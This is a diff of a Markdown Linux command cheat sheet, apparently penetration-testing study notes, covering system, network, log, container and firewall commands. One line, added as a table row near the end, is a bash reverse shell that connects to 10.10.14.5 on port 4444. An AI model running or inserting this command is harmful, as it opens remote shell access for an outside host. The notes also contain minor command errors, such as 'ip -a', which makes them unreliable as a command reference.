@@ -39,7 +39,7 @@ identify OS: `lsb_release -a`
 identify OS: `uname -a`
 determine Linux distribution: `cat /etc/*-release`
 
-# 📖 Getting Help
+# Getting Help
 | Command          | Purpose          |
 | ---------------- | ---------------- |
 | `man <cmd>`      | View manual      |
@@ -47,15 +47,16 @@ determine Linux distribution: `cat /etc/*-release`
 | `apropos search` | Search manpages  |
 Example: `man sudo` or `grep -r "ssh" /usr/share/man/`
 
-# 🖥️ System Information
+# System Information
 | Command    | Purpose      |
 | ---------- | ------------ |
 | `uname -a` | Kernel, hostname, version, os info  |
 | `df -h`    | Disk usage   |
 | `free -m`  | Memory usage |
 | `lscpu`    | CPU info     |
-
 Example: `cat /proc/version` or `ps aux | grep root`
+
+See top system usage (dynamic): `top` or `htop`
 
 ---
 
@@ -137,7 +138,7 @@ Check network interfaces: `nano /etc/network/interfaces/xx`
 Netstat is used to display active network connections and their associated ports.  
 Check active connections: `netstat -ano`
 
-# 💻 Web Services
+# Web Services
 Look at a website via CLI: `curl http://10.10.10.5`
 Download files from FTP or HTTP servers: `wget http://10.10.10.5`
 Start the Python 3 web server:`python3 -m http.server 80`
@@ -146,45 +147,18 @@ Start the Python 3 web server:`python3 -m http.server 80`
 Backup a local Directory to our Remote Server: `rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory`
 Zip a folder: `tar -czvf backup.tar.gz /etc/`
 
-# 📁 File System Management
+# File System Management
 List mounted items: `df -h`
 List disks: `sudo fdisk -l`
 Mounting a disk or file system: `mount /dev/sda1 /mnt` or via fstab `nano /etc/fstab`
-```bash
 
-```
-
-```bash
-df -h
-```
+# System Logs
+Check logs for SSH: `journalctl -u ssh`
+Search logs for keyword eg auth: `grep "auth" /var/log/*`
 
 ---
 
-# 📜 System Logs
-
-```bash
-journalctl -u ssh
-```
-
-```bash
-grep "auth" /var/log/*
-```
-
----
-
-# 📉 Monitoring
-
-```bash
-top
-```
-
-```bash
-htop
-```
-
----
-
-## 📦 Containerization (Intro)
+## Containerization
 
 | Tool           | Usage               |
 | -------------- | ------------------- |
@@ -193,46 +167,32 @@ htop
 | LXC            | Lightweight VMs     |
 | systemd-nspawn | Linux jail-like     |
 
-**Example:**
-
+**Examples:**
 ```bash
-docker run -it kalilinux/kali-rolling bash
+docker run -p <host port>:<docker port> -d <docker container name>
 ```
 
 ---
 
-## 🌐 Networking – Linux
+## Networking
+Check IP Address: `ip -a`
+Check IP Configuration: `ifconfig`
+Check network interface status: `nmcli device status`
 
-```bash
-ip a
-```
-
-```bash
-nmcli device status
-```
-
-### Remote Desktop Protocols
-
+# Remote Desktop Protocols
 | Protocol | Tool          |
 | -------- | ------------- |
 | SSH      | `ssh user@ip` |
 | RDP      | `xfreerdp`    |
 | VNC      | `vncviewer`   |
 
----
+# Firewalls
+Check firewall status: `ufw status`
+Look at various network traffic: `iptables -L`
 
-### 🔥 Firewalls
 
-```bash
-ufw status
-```
 
-```bash
-iptables -L
-```
-reverse shell):`bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
 
----
 ---
 
 # 📋 Linux Cheat Sheet (Quick Reference)
@@ -258,21 +218,6 @@ reverse shell):`bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
 | `grep`              | Search patterns     |
 | `chmod`             | File permissions    |
 | `chown`             | Change owner        |
-
----
-
-Let me know if you'd like:
-
-* **Beginner → Advanced HTB Linux Path**
-* **Privilege Escalation Automation Script**
-* **PDF printable version**
-* **Flashcards for memory training**
-
-🔥 Ready for the next level?
-
-```bash
-sudo -l        # Check for privilege escalation vectors
-```
-
+| `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`  | reverse shell        |
 
 
